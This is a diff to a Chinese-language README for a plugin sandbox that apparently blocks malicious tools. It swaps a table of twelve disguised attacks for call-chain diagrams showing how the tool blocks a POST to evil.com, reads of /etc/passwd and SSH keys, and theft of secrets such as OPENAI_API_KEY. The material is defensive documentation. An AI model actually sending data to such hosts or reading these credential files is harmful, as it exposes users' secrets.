@@ -160,22 +160,72 @@ blacklist:
 
 ---
 
-## 12 种可拦截攻击
+## 攻击拦截流程
 
-| # | 表面功能 | 隐藏恶意 | 拦截方式 |
-|:--:|------|------|------|
-| 1 | 数据分析 | POST evil.com | check_domain 精确命中 |
-| 2 | 导出助手 | POST *.cn | check_domain 后缀匹配 |
-| 3 | 网络诊断 | GET 192.168.1.100 | 内网 IP 黑名单 |
-| 4 | 配置读取 | open(/etc/passwd) | check_path 精确命中 |
-| 5 | SSH 导入 | open(~/.ssh/id_rsa) | check_path 前缀匹配 |
-| 6 | 系统信息 | open(C:\Windows\SAM) | check_path 前缀匹配 |
-| 7 | AI 插件 | getenv(OPENAI_API_KEY) | check_env 敏感模式 |
-| 8 | 数据库迁移 | getenv(DATABASE_URL) | check_env 敏感模式 |
-| 9 | 备份同步 | POST stealer.cc | check_domain 精确命中 |
-| 10 | 开发监控 | GET localhost:3000 | 回环地址黑名单 |
-| 11 | CI 检查 | getenv(GITHUB_TOKEN) | TOKEN 关键词 |
-| 12 | 云备份 | open(.aws) + POST evil | 双重拦截 |
+以三类典型攻击为例，展示从调用到拦截的完整链路。
+
+### 域名拦截（攻击 #1：evil.com 数据外泄）
+
+```
+1. 工具发起 HTTP 请求 → POST https://evil.com/collect
+       │
+2. sandbox.mbt::sandbox_http_request()
+       提取域名 "evil.com"
+       │
+3. core.mbt::check_domain()
+       ├─ HashMap.get("evil.com") → Some("known-malware-c2")
+       └─ 返回 Deny
+       │
+4. aegisrun.mbt::check_domain()
+       缓存结果 → total_blocks++
+       │
+5. 返回 "BLOCKED: domain 'evil.com' is blacklisted"
+       HTTP 请求在 sandbox 层被拦截，包未发出
+```
+
+策略来源：`presets/standard.yaml` → `blacklist.network.domains` → 编译期嵌入 `core.mbt::load_standard_preset()`
+
+### 路径拦截（攻击 #4：/etc/passwd 文件窃取）
+
+```
+1. 工具调用 open("/etc/passwd")
+       │
+2. sandbox.mbt::sandbox_file_open()     ← MoonBit 策略层
+   runtime/lib.rs::sandbox_read_file()  ← Rust OS 拦截层
+       │
+3. check_path() → HashMap.exact_match("/etc/passwd") → Deny
+       │
+4. Rust 层 read_to_string() 未被调用
+   WASI 层 path_open() 被 preopen 检查拒绝
+```
+
+策略来源：`presets/standard.yaml` → `blacklist.filesystem.paths` → 30+ 条精确路径 + 前缀目录
+
+### 环境变量拦截（攻击 #7：OPENAI_API_KEY 窃取）
+
+```
+1. 工具调用 getenv("OPENAI_API_KEY")
+       │
+2. core.mbt::check_env()
+       ├─ 遍历 sensitive_envs（36 条模式）
+       │    "OPENAI_API_KEY" 精确命中
+       └─ 返回 Deny
+       │
+3. Rust 层 std::env::var() 未被调用
+   WASI 层 environ_get() 返回过滤后的安全变量列表
+```
+
+策略来源：`presets/standard.yaml` → `blacklist.env_vars` → 36 条 AI/云/数据库/CI 密钥模式
+
+### 调用链速查
+
+| 攻击类型 | 入口文件 | 策略文件 | 拦截函数 |
+|----------|----------|----------|----------|
+| 域名 | `sandbox.mbt:74` | `core.mbt:216` | `check_domain()` |
+| 路径 | `sandbox.mbt` / `lib.rs:83` | `core.mbt:146` | `check_path()` |
+| 环境变量 | `sandbox.mbt` / `lib.rs:91` | `core.mbt:172` | `check_env()` |
+| DNS 劫持 | `dns_guard.mbt:77` | `dns_guard.mbt:29` | `check_ip()` |
+| 风险评分 | `scorer.mbt:36` | 内置评分规则 | `score_manifest()` |
 
 ---
 
